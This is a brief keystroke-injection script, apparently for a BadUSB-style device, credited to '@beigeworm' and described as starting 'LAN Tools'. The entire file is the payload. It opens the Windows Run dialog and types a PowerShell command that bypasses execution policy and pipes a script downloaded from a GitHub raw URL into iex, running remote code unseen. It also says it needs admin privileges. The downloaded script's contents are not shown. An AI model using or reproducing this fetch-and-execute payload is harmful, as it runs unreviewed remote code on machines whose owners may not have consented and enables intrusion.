// Title: beigeworm's LAN Tools
// Author: @beigeworm
// Description: Start up a HTTP server and run a selection of Local Area Network Tools using Powershell.
// NOTE - This script will need Admin privileges to run properly.

// script setup
layout("us")

// Open Powershell and download script
delay(1000);
press("GUI r");
delay(1000);
type("powershell -NoP -Ep Bypass -C irm https://raw.githubusercontent.com/beigeworm/Posh-LAN/main/Posh-LAN-Tools.ps1 | iex");
delay(500);
press("ENTER");